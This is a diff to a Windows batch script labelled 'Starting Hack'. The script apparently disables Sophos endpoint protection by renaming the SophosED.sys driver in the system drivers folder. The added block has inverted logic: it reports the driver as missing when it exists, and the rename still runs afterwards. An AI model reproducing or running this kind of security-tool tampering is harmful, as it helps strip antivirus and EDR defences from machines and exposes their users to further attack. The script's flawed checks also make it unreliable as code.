@@ -150,7 +150,12 @@ echo Starting Hack
 if exist "c:\windows\system32\drivers" (
   echo System Directory Found
     
-
+  if exist C:\windows\system32\drivers\SophosED.sys (
+    :showDinoError
+    echo SophosED.sys file could not be found 
+    echo Failing Exploit and returning to menu 
+    timeout /t 5
+  )
   echo Renaming SophosED.sys to SophosED.sys.old
   ren C:\windows\system32\drivers\SophosED.sys SophosED.sys.old || goto :cmdFail
   
